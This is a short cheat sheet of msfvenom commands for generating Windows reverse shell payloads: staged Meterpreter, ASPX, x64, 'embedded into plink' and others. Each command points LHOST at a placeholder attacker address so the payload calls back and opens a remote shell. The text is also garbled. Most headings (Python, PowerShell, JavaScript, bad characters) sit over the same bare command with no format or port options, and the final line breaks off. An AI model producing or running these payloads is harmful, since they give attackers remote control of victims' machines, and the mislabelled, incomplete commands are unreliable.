# **Windows**

#Windows Unicode reverse shell (for html or browser exploit) without encoder  
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  
**

### # Windows non staged reverse shell

**

###   
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  

**

### # Windows Staged (Meterpreter) reverse shell

**

###   
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x  
  

**

### # Windows Python reverse shell

**

###   
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  

**

### # Windows ASP reverse shell

**

###   
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  

**

### # Windows ASPX reverse shell

**

###   
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  

**

### # Windows JavaScript reverse shell with nops

**

###   
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  

**

### # Windows Powershell reverse shell

**

###   
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x  
  

**

### # Windows reverse shell excluding bad characters

**

###   
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=x.x.x.x  
  

**

### # Windows x64 bit reverse shell

**

###   
msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x  
  

**

### # Windows reverse shell embedded into plink

**

###   
msfvenom -p windows/shell_reverse_tcp LHOST=

x.x.x.x